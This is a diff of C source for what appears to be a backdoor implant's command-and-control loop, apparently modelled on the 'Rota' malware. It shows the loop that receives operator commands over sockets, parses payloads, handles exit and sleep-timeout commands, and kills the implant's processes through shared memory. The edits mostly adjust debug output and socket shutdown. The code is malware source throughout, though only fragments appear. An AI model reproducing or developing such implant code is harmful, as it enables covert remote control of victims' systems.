@@ -64,7 +64,7 @@ void c2_loop() {
     }
     // interactive c2 loop
     #ifdef DEBUG
-        printf("(%d) In c2 loop...\n", getpid());
+        printf("\n(%d) In c2 loop...\n", getpid());
     #endif
         // receive
         int n = 0;
@@ -104,17 +104,17 @@ void c2_loop() {
         }
         // get payload length
         payload_length = parse_c2_payload_len(buffer);
-
         char *payload = parse_c2_payload(buffer, payload_length);
 
         #ifdef DEBUG
-        printf("\nPayload length is %d\n", payload_length);
-        printf("\nPayload is %s\n", payload);
+        printf("Timeout is %d\n", sleepy_time);
+        printf("Payload is %s\n", payload);
+        printf("Payload length is %d\n", payload_length);
         #endif
 
         if (memcmp(&rota_c2_exit, cmd_id, 4) == 0) {
             #ifdef DEBUG
-            printf("[+] Rota C2 Run exiting!");
+            printf("[+] Rota C2 Run exiting!\n");
             #endif
             c2_exit(sock, sock2);
         }
@@ -125,7 +125,7 @@ void c2_loop() {
         }
         else if (memcmp(&rota_c2_set_timeout, cmd_id, 4) == 0) {
             #ifdef DEBUG
-            printf("[+] Rota C2 set timeout!");
+            printf("[+] Rota C2 set timeout!\n");
             #endif
 
             // convert c2 sleep time
@@ -136,10 +136,6 @@ void c2_loop() {
             // update c2 sleep time
             c2_set_timeout(&sleepy_time, new_sleepy_time);
             char *msg= "sleepy time updated !";
-
-            #ifdef DEBUG
-            printf("New sleep time is: %d", sleepy_time);
-            #endif
 
             build_c2_response(msg, cmd_id, sock2);
         }
@@ -280,16 +276,24 @@ void c2_loop() {
         free(payload);
         free(cmd_id);
         memset(buffer, 0, strlen(buffer));
-        memset(payload, 0, payload_length);
+        shutdown(sock, 0);
         close(sock);
+
+        shutdown(sock2, 0);
+        close(sock2);
+
     }
 
         memset(buffer, 0, strlen(buffer));
         sleep(sleepy_time);
-        close(sock);
+        shutdown(sock, 0);
+        shutdown(sock2, 0);
+        //close(sock);
     }
-
+    shutdown(sock, 0);
+    shutdown(sock2, 0);
     close(sock);
+    close(sock2);
     exit(0);
 }
 
@@ -328,8 +332,10 @@ void c2_exit(int sock, int sock2) {
     // get pids from sharedmem and kill both pids
     int shmid = shmget(0x64b2e2, 8, 0666);
 
-		close(sock);
-		close(sock2);
+    shutdown(sock, 0);
+    close(sock);
+    shutdown(sock2, 0);
+    close(sock2);
 
     // if handled on sharedmem cannot be obtained
     if (shmid == -1) {
@@ -511,7 +517,6 @@ char *parse_c2_payload( char *buffer, int length) {
 }
 
 void build_c2_response(char *buffer, char *cmd_id, int sock){
-
     char *rota_resp_pkt = initial_rota_pkt();
 
     // correct length of payload on buffer
